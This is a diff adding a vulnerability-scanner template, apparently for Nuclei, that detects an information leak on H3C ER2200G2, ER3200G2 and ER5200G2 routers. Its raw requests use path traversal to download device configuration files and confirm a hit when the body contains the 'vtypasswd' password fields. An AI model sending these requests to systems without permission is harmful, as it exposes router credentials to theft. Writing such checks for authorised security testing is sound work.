@@ -1,0 +1,33 @@
+id: H3C-informationLeakage
+
+info:
+  name: H3C-informationLeakage
+  author: iSee857
+  severity: high
+  description: H3C-informationLeakage
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
+        Host: {{Host}}
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../ER3200G2.cfg HTTP/1.1
+        Host: {{Host}}
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+        Host: {{Host}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "vtypasswd"
+          - "vtypasswdtype"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
